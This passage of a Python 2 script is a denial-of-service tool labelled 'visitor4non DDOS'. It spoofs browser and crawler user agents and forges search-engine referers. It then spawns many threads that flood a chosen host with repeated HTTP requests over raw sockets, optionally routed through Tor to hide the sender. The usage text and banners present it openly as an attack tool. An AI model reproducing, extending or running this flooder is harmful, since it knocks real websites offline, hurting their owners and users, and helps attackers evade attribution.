 "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)",
 "Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)",
 "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.97 Safari/537.22 Perk/3.3.0.0)",
 "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)",
 "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8)",
 "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7",
 "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
 "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
 "YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)",
 "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51)",
 "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6",
 "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)",
 "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8.1.12) Gecko/20080201Firefox/2.0.0.12",
 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7) ",                                              #####################
 "AppleWebKit/534.48.3 (KHTML, like Gecko) Version/5.1 Safari/534.48.3",                       #                   #
 "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) ",                                  # visitor4non DDOS  #
 "AppleWebKit/533.21.1 (KHTML, like Gecko) Version/5.0.5 Safari/533.21.1",                     # by- rouze-d       #
 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:5.0.1)"                                      #                   #
 "Gecko/20100101 Firefox/5.0.1",                                                               #####################
 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0)"
 "AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.122 Safari/534.30",
 "Opera/9.80 (Macintosh; Intel Mac OS X 10.7.0; U; Edition MacAppStore; en) "
 "Presto/2.9.168 Version/11.50",
 "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2)",
 "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7",
 "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
 "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13",
 "Mozilla/5.0 (compatible; Baiduspider/2.0;+http://www.baidu.com/search/spider.html)",
 "magpie-crawler/1.1 (U; Linux amd64; en-GB; +http://www.brandwatch.net)",
 "Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16",
 "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)",
 "Mozilla/5.7.4 (Fedora015; U; AMD_PhenX6 Linux Kernal 2.6.35.2; en-UK) DevKit/534.7 (Gecko) Chrome/7.0.517.44 GoogleR/9.47.1[BlackPanda]",
]





class httpPost(Thread):
    def __init__(self, host, port, tor):
        Thread.__init__(self)
        self.host = host
        self.port = port
        self.socks = socks.socksocket()
        self.tor = tor
        self.running = True


    def _send_http_post(self):
        global stop_now
        qq = range(5, 30)
        keep = range(100, 1000)
        content = range(100, 1000)
        accept = [
        'ISO-8859-1',
        'Windows-1251',
        'ISO-8559-2',
        'ISO-8859-15',
        ]
        typ = [
        'multipart/form-data',
        'application/x-url-encoded',
        'text/html',
        ]
        referer = [
        'http://www.google.com/',
        'http://www.bing.com/',
        'http://www.baidu.com/',
        'http://www.yandex.com/',
        'http://www.yahoo.com/',
        'http://www.globo.com/',
        'http://www.pastebin.com/',
        'https://www.nasa.gov/',                                                                 #####################
        'https://www.facebook.com/',                                                             #                   #
        'http://www.chris.com/',                                                                 # visitor4non DDOS  #
        'http://www.retrojunkie.com/',                                                           # by- rouze-d       #
        'http://www.usatoday.com/',                                                              #                   #
        'http://www.engadget.search.aol.com/',                                                   #####################
        'http://www.ask.com/',
        'http://www.sogou.com/',
        'http://www.zhongsou.com/',
        'http://www.dmoz.org/',
        'https://www.google.com/',
        'http://' + self.host + '/',
        'https://' + self.host +'/',
        'http://www.google.com/?q=' + self.host +'',
        'https://www.google.com/?q=' + self.host +'',
        'http://www.usatoday.com/search/results?q=' + self.host +'',
        'http://engadget.search.aol.com/search?q=' + self.host +'',
        'http://api.duckduckgo.com/html/?q=' + self.host +'',
        'http://boorow.com/Pages/site_br_aspx?query=' + self.host +'',
        'http://busca.uol.com.br/web/?q=' + self.host +'',
        'http://engadget.search.aol.com/search?q=' + self.host +'',
        'http://find.ezilon.com/search.php?q=' + self.host +'',
        'http://hksearch.timway.com/search.php?query=' + self.host +'',
        'http://search.lycos.com/web/?q=' + self.host +'',
        'http://search.yahoo.com/search?p=' + self.host +'',
        'http://us.yhs4.search.yahoo.com/yhs/search?p=' + self.host +'',
        'http://www.ask.com/web?q=' + self.host +'',
        'http://www.baidu.com.br/s?usm=1&rn=100&wd=' + self.host +'',
        'http://www.bing.com/search?q=' + self.host +'',
        'http://www.dmoz.org/search/search?q=' + self.host +'',
        'http://www.sogou.com/web?query=' + self.host +'',
        'http://www.usatoday.com/search/results?q=' + self.host +'',
        'http://www.zhongsou.com/third?w=' + self.host +'',
        'http://yandex.ru/yandsearch?text=' + self.host +'',
        ]


        #self.socks.send("%s / HTTP/1.1\r\n" # change to POST if you want attack post method
        magic = ("%s /%s HTTP/%s\r\n" # change to POST if you want attack post method
        "Host: %s\r\n"                                                                    #####################
        "User-Agent: %s\r\n"                                                              #                   #
        "Referer: %s\r\n"                                                                 # visitor4non DDOS  #
        "Accept-Charset: %s,utf-8;q=0.7,*;q=0.7\r\n"                                      # by- rouze-d       #
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.%s,*/*;q=0.%s\r\n"   #                   #
        "Cache-Control: no-cache, max-age=0\r\n"                                          #####################
        "Connection: keep-alive\r\n"
        "Keep-Alive: %s\r\n"
        "Content-Length: %s\r\n"
        #"Transfer-Encoding: chunked\r\n"
        "Content-Type: %s\r\n\r\n" %
        (random.choice(head), random.choice(para), random.choice(http), self.host, random.choice(useragents), random.choice(referer), random.choice(accept), random.choice(qq), random.choice(qq), random.choice(keep), random.choice(content), random.choice(typ)))

        for i in range(0, 9999):
            if stop_now:
                self.running = True
                #self.running = False
                break

            os.system(SysCls)
            print ""
            print "\nSENDING PACKETS!:\n%s" % magic
            self.socks.send(magic)
            #time.sleep(random.uniform(0.1, 0.1))
            time.sleep(random.uniform(0.1, 1))


        self.socks.close()

    def run(self):
        while self.running:
            while self.running:
                try:
                    if self.tor:
                        self.socks.setproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050)
                    self.socks.connect((self.host, self.port))
                    os.system(SysCls)
                    print ""
                    print "\nConnected to host..."
                    break
                except Exception, e:
                    if e.args[0] == 106 or e.args[0] == 60:
                        break
                    os.system(SysCls)
                    print ""
                    print "\nError - Check internet | target down | or removed http://"
                    time.sleep(1)
                    continue


            while self.running:
                try:
                    self._send_http_post()
                except Exception, e:
                    if e.args[0] == 32 or e.args[0] == 104:
                        print "\nThread broken, restarting..."
                        self.socks = socks.socksocket()
                        break
                    time.sleep(0.1)
                    pass

def usage():

    print " python visitor4non.py -t <target> -p <port> -r <threads> -T"
    print " -t | --target <Hostname|IP>"
    print " -p | --port <Web Server Port> Defaults is 80"
    print " -r | --threads <Number of threads> Defaults is 1"
    print " -T | --tor Enable anonymising through tor on 127.0.0.1:9050"
    print ""
    print " Eg: python visitor4non.py -t www.taget.com -p 80 -r 256"
    print " Press Ctrl + Z for cancel Attack\n"

def main(argv):

    try:
        opts, args = getopt.getopt(argv, "hTt:r:p:", ["help", "tor", "target=", "threads=", "port="])
    except getopt.GetoptError:
        usage()
        sys.exit(-1)

    global stop_now

    target = ''
    threads = 1
    tor = False
    port = 80

    for o, a in opts:
        if o in ("-h", "--help"):
            usage()
            sys.exit(0)
        if o in ("-T", "--tor"):
            tor = True
        elif o in ("-t", "--target"):
            target = a
        elif o in ("-r", "--threads"):
            threads = int(a)
        elif o in ("-p", "--port"):
            port = int(a)


    if target == '' or int(threads) <= 0:
        usage()
        sys.exit(-1)

    print ""
    print "             ;odddddddo;             "
    print "         ,,,'           ,,,,         "
    print "       :,                   ,:       "
    print "     c                         c     "
    print "   :; 'ko                   dk' :;   "
    print "  c,,0lx         :;d         xl0',:  "
    print " ':xoOx           ';          kOox:  "
    print " d kkO,           l           ,0kx d "
    print " dl:xd          ' d '          dx:ld "
    print " d'Xdx      dOKWl k oWKOd      xdX d "
    print " d:oklo    ,MMMMO M OMMMM,    olko:d "
    print "  cc0xO;   oMMMMMKMKMMMMMl   ;Ox0cc  "
    print "  ::ldxlO  0MMMMMMMMMMMMMO  Ocxdc::  "
    print "   ;:,kxKkxWMMMMMMMMMMMMMNxkKxk,:,   "
    print "     c:;lxk000MMMMMMMMM000kxl;:c     "
    print "       :;,;ld0MMMMMMMMM0dl;,;:       "
    print "         ',,,oMMMMMMMMMl,,,'         "
    print "             'oOXWWWXOo'  "
    print ""
    print "/*"
    print " * Target: %s Port: %d" % (target, port)
    print " * Threads: %d Tor: %s" % (threads, tor)
    print " * Give 20 seconds without tor or 40 with before checking site"
    print " * Press Ctrl + Z for cancel Attack"
    print " */"

    rthreads = []
    for i in range(threads):
        t = httpPost(target, port, tor)
        rthreads.append(t)
        t.start()

    while len(rthreads) > 0:
        try:
            rthreads = [t.join(1) for t in rthreads if t is not None and t.isAlive()]
        except KeyboardInterrupt:
            print "\nShutting down threads...\n"
            for t in rthreads:
                stop_now = True
                t.running = False




if __name__ == "__main__":
    print ""
    print "             ;odddddddo;             "
    print "         ,,,'           ,,,,         "
    print "       :,                   ,:       "
    print "     c                         c     "
    print "   :; 'ko                   dk' :;   "
    print "  c,,0lx         :;d         xl0',:  "
    print " ':xoOx           ';          kOox:  "
    print " d kkO,           l           ,0kx d "
    print " dl:xd          ' d '          dx:ld "
    print " d'Xdx      dOKWl k oWKOd      xdX d "
    print " d:oklo    ,MMMMO M OMMMM,    olko:d "
    print "  cc0xO;   oMMMMMKMKMMMMMl   ;Ox0cc  "
    print "  ::ldxlO  0MMMMMMMMMMMMMO  Ocxdc::  "
    print "   ;:,kxKkxWMMMMMMMMMMMMMNxkKxk,:,   "
    print "     c:;lxk000MMMMMMMMM000kxl;:c     "
    print "       :;,;ld0MMMMMMMMM0dl;,;:       "
    print "         ',,,oMMMMMMMMMl,,,'         "
    print "             'oOXWWWXOo'  "
    print ""
    print (RED+" visitor4non DDOS"+WHITE)
    print (" by-"+GREEN+" rouze-d"+WHITE+"  ~yes, i'am ScriptKiddies ")
    print ""


    main(sys.argv[1:])

